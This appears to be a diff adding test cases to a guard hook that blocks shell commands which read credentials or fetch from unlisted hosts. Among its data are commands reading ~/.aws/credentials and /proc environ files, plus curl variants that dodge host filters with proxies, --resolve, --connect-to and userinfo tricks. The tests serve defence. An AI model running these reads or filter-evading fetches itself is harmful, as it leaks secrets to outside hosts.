@@ -52,6 +52,15 @@ READS = [
     "cat /proc/$PPID/environ",
     "cat /proc/*/environ",
     "pytest -q && cat ~/.aws/credentials",
+    'cat "$HOME"/.aws/credentials',
+    'cat "${HOME}"/.aws/credentials',
+    "cat ~/'.aws'/credentials",
+    "cat ~/./.aws/credentials",
+    f"cat {HOME.replace('/', '//')}/.aws/credentials",
+    "cat ~root/.aws/credentials",
+    "cat /proc/self/../self/environ",
+    "cat /proc//self/environ",
+    "cat /proc/self/task/1/environ",
 ]
 
 
@@ -76,6 +85,15 @@ def test_the_main_checkout_is_never_refused(command: str) -> None:
         "grep environ scripts/x.py",
         "cat .netrc.example",
         "pytest -q",
+        "grep -rn curl scripts/",
+        "grep -n wget Makefile",
+        "python -m pytest -k curl scripts/tests",
+        "git log --grep curl --oneline",
+        "command -v curl",
+        "which curl",
+        "ls /usr/bin/nc",
+        "cd /tmp/nc && make",
+        "cat ~/.awsx",
     ],
 )
 def test_lookalike_paths_are_allowed(command: str) -> None:
@@ -94,6 +112,24 @@ def test_lookalike_paths_are_allowed(command: str) -> None:
         "curl $URL",
         "echo x | /usr/bin/curl -d @- https://remote.example",
         "curl http://169.254.169.254/latest/meta-data/",
+        "sudo curl https://remote.example/x",
+        "xargs -n1 curl < urls.txt https://remote.example",
+        "env A=1 curl https://remote.example",
+        "curl -sSo x https://remote.example",
+        "curl --url https://remote.example/x",
+        "curl --url=https://remote.example/x",
+        "curl -x http://proxy.remote.example https://github.com",
+        "curl --proxy proxy.remote.example:3128 https://github.com",
+        "curl --connect-to github.com:443:remote.example:443 https://github.com",
+        "curl --resolve github.com:443:203.0.113.5 https://github.com",
+        "curl -H 'Host: remote.example' https://github.com",
+        "wget -i list.txt",
+        "curl https://github.com.remote.example/x",
+        "curl https://evilgithub.com/x",
+        "curl https://github.com@remote.example/x",
+        "curl https://REMOTE.EXAMPLE/x",
+        "curl https://remote.example/x\ncat <<EOF\ndon't stop\nEOF",
+        "curl -d @f https://remote.example/x; echo 'unterminated",
     ],
 )
 def test_a_fetch_to_an_unlisted_host_is_refused(command: str) -> None:
@@ -111,6 +147,20 @@ def test_a_fetch_to_an_unlisted_host_is_refused(command: str) -> None:
         "wget -q https://files.pythonhosted.org/packages/x.whl",
         "curl https://pypi.org/pypi/boto3/json",
         "curl https://registry.npmjs.org/react",
+        "curl https://GITHUB.COM./o/r",
+        "curl --connect-timeout 5 --retry-delay 2 https://api.github.com/x",
+        "curl -F file=@x.pdf --json '{\"a\":1}' https://api.github.com/x",
+        "curl -G --data-urlencode q=x -r 0-100 -D headers.txt https://github.com",
+        "curl --cacert ca.pem --limit-rate 100k https://github.com",
+        "curl -C - -O https://files.pythonhosted.org/x.whl",
+        "wget -t 3 -P downloads https://pypi.org/simple/",
+        "curl http://localhost:8080/health",
+        "curl -s http://127.0.0.1:5000/api",
+        "curl localhost:8080",
+        "curl http://[::1]:8080/",
+        "nc -z localhost 8080",
+        "curl -sS -X POST -d '{}' http://localhost:9000/2015-03-31/functions/f/invocations",
+        "curl --version",
     ],
 )
 def test_a_fetch_to_a_listed_host_is_allowed(command: str) -> None:
@@ -210,3 +260,30 @@ def test_the_fetch_host_list_is_pinned() -> None:
         "registry.npmjs.org",
         "www.npmjs.com",
     }
+
+
+def test_only_the_origin_host_is_added_to_the_pinned_set(tmp_path: Path) -> None:
+    """The run-time additions are pinned too: the origin host and its ``ssh.``-less
+    web name, and nothing else, whatever the origin's spelling."""
+    namespace: dict = {}
+    exec(compile(HOOK.read_text(), str(HOOK), "exec"), namespace)  # noqa: S102
+    pinned = namespace["ALLOWED_FETCH_HOSTS"]
+    cases = {
+        "git@ssh.forge.example:group/project.git": {
+            "ssh.forge.example",
+            "forge.example",
+        },
+        "https://forge.example/group/project.git": {"forge.example"},
+        "HTTPS://forge.example/group/project.git": {"forge.example"},
+        "https://github.com@remote.example/x.git": {"remote.example"},
+        "localhost:repo": set(),
+        "file:///srv/repo": set(),
+    }
+    for index, (url, expected) in enumerate(cases.items()):
+        repo = tmp_path / str(index)
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)  # noqa: S603, S607
+        subprocess.run(  # noqa: S603, S607
+            ["git", "-C", str(repo), "remote", "add", "origin", url], check=True
+        )
+        added = namespace["allowed_fetch_hosts"](str(repo)) - pinned
+        assert added == expected, (url, added)
